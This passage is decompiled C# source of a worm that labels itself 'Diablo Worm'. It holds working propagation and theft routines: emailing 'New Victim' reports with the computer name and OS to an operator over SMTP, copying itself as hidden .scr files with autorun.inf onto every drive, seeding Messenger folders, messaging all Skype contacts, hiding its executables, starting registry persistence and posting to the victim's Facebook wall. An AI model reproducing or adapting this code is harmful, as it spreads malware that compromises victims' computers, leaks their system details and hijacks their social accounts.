				TextBox22.set_Text("0");
			}
			if (Operators.CompareString(TextBox22.get_Text(), "1", false) == 0)
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(TextBox24.get_Text());
				mailMessage.To.Add(TextBox24.get_Text());
				mailMessage.Subject = "+---New Victim !---+" + ((ServerComputer)MyProject.Computer).get_Name();
				mailMessage.Body = "[Diablo Worm /+\\ New Victim !]\r\n\r\nComputer Name:    " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\nOS:    " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\nRAM:    ";
				SmtpClient smtpClient = new SmtpClient("smtp.live.com");
				smtpClient.Port = Conversions.ToInteger(TextBox25.get_Text());
				smtpClient.Credentials = new NetworkCredential(TextBox24.get_Text(), TextBox23.get_Text());
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				StreamWriter streamWriter = new StreamWriter("C:\\WINDOWS\\Tempinternet.txt");
				streamWriter.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void USB()
	{
		if (Operators.CompareString(TextBox12.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				try
				{
					File.Copy(Application.get_ExecutablePath(), programFiles + "black.scr");
					StreamWriter streamWriter = new StreamWriter(programFiles + "\\autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=" + programFiles + "black.scr");
					streamWriter.WriteLine("shellexecute=" + programFiles, 1);
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "black.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void MSN()
	{
		_ = Assembly.GetExecutingAssembly().GetModules()[0];
		string executablePath = Application.get_ExecutablePath();
		string text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
		if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
		{
			return;
		}
		int num = 0;
		string[] directories = Directory.GetDirectories(text);
		int upperBound = directories.GetUpperBound(0);
		for (num = 0; num <= upperBound; num = checked(num + 1))
		{
			if (Operators.CompareString(FileSystem.Dir(directories[num], (FileAttribute)16), "", false) != 0 && !File.Exists(directories[num] + "\\picture.scr"))
			{
				File.Copy(executablePath, directories[num] + "\\picture.scr");
			}
		}
	}

	public void LAN()
	{
		if (Operators.CompareString(TextBox13.get_Text(), "1", false) != 0)
		{
		}
	}

	public void MSkypeS()
	{
		if (Operators.CompareString(TextBox14.get_Text(), "1", false) != 0)
		{
			return;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.Skype", ""));
		NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Attach", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
				object[] array = new object[2];
				object obj = objectValue2;
				array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Handle", new object[0], (string[])null, (Type[])null, (bool[])null));
				TextBox textBox = TextBox15;
				array[1] = textBox.get_Text();
				object[] array2 = array;
				bool[] array3 = new bool[2] { true, true };
				NewLateBinding.LateCall(objectValue, (Type)null, "SendMessage", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					NewLateBinding.LateSetComplex(obj, (Type)null, "Handle", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
				}
				if (array3[1])
				{
					textBox.set_Text((string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string)));
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void CacherFichier()
	{
		if (Operators.CompareString(TextBox19.get_Text(), "1", false) != 0)
		{
			return;
		}
		if (Operators.CompareString(TextBox7.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName = "C:\\Windows\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo = new FileInfo(fileName);
				fileInfo.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox6.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName2 = "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo2 = new FileInfo(fileName2);
				fileInfo2.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox8.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName3 = "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo3 = new FileInfo(fileName3);
				fileInfo3.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void persit()
	{
		if (Operators.CompareString(TextBox21.get_Text(), "1", false) == 0)
		{
			Thread thread = new Thread(RegPersistence.Persistence);
			thread.Start();
		}
	}

	public void FBWall(string message)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		if (Operators.CompareString(TextBox26.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			WebBrowser val = new WebBrowser();
			val.Navigate("http://m.facebook.com/home.php?");
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = val.get_Document().get_All().GetEnumerator();
				while (enumerator.MoveNext())
				{
					HtmlElement val2 = (HtmlElement)enumerator.Current;
					if (Operators.CompareString(val2.GetAttribute("name"), "status", false) == 0)
					{
						val2.SetAttribute("value", message);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = val.get_Document().get_All().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					HtmlElement val3 = (HtmlElement)enumerator2.Current;
					if (Operators.CompareString(val3.GetAttribute("name"), "update", false) == 0)
					{
						val3.InvokeMember("click");
					}
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
